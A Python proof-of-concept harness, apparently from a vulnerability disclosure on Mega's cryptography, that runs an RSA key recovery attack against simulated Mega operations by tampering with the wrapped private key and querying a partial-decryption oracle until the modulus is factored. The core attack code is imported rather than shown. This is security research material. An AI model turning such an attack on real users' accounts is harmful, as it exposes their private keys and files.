
#
# This file is part of the PoCs for various issues found in the cryptographic
# design of Mega.
#
# Content: PoC of the RSA Key Recovery attack on the simulated operations of
# Mega.
#

from secrets import randbelow, token_bytes
import sys

from shared.constants.mega_crypto import *
from shared.mega_simulation import *

from issue_01.rsa_key_recovery_attack import MegaRSAKeyRecoveryAttack
from issue_01.rsa_key_recovery_attack_optimized \
    import MegaRSAKeyRecoveryAttack as MegaRSAKeyRecoveryAttackOpt

class PoCAbstractRsaKeyRecovery:
    def __init__(self, impl):
        if impl not in ["original", "fast", "small"]:
            raise ValueError(f"Implementation {impl} must be one of original, fast, or small.")
        self.impl = impl

        print("# Initialize abstract RSA key recovery PoC")
        print(f"## Generate fresh RSA-{RSA_MODULUS_BIT_SIZE} keys")
        self.privk, self.pubk = gen_rsa_keys(RSA_MODULUS_BIT_SIZE)
        self.privk_encoded = decode_rsa_privk(self.privk)

        self.kM = token_bytes(MASTER_KEY_BYTE_LEN)
        self.wrapped_priv = encrypt_rsa_sk(self.privk_encoded, self.kM)

    def _partial_decryption_oracle(self, privk_enc, c):
        privk = decrypt_rsa_sk(privk_enc, self.kM)
        return rsa_decrypt(c, privk)[:SID_LEN]

    def run_sanity_checks(self):
        print("## Run sanity checks")
        # Enc/dec
        m = token_bytes(64)
        m_res = rsa_decrypt(rsa_encrypt(m, self.pubk), self.privk_encoded)[:len(m)]
        assert m_res == m
        print("### RSA enc/dec correctness: success")

    def build_attack(self, pubk, wrapped_priv):
        if self.impl == "original":
            return MegaRSAKeyRecoveryAttack(pubk, wrapped_priv)
        elif self.impl == "fast":
            return MegaRSAKeyRecoveryAttackOpt(pubk, wrapped_priv)
        elif self.impl == "small":
            return MegaRSAKeyRecoveryAttackOpt(pubk, wrapped_priv, do_brute_force=True)
        else:
            raise NotImplementedError

    def rsa_key_recovery_attack(self, oracle, pubk, wrapped_priv):
        attack = self.build_attack(pubk, wrapped_priv)

        while True:
            try:
                wrapped, ct = attack.get_next_wrapped_key_and_ciphertext()
                r = oracle(wrapped, ct)

                if attack.feed_response(bytes_to_int(r)):
                    print(f"\r## Running attack", end="")
                    print("\n## Attack successful!")
                    print(f"### Factored {attack.n} = {attack.p} * {attack.q} with "
                          f"{attack.oracle_queries} oracle queries")
                    break
            except KeyboardInterrupt:
                sys.exit(-1)
            except:
                # Something went wrong in the attack, so terminate.
                break

        return

    def run_attack(self):
        print("# Starting abstract attack")
        print("## Tamper with encrypted key")
        self.rsa_key_recovery_attack(self._partial_decryption_oracle, self.pubk, self.wrapped_priv)
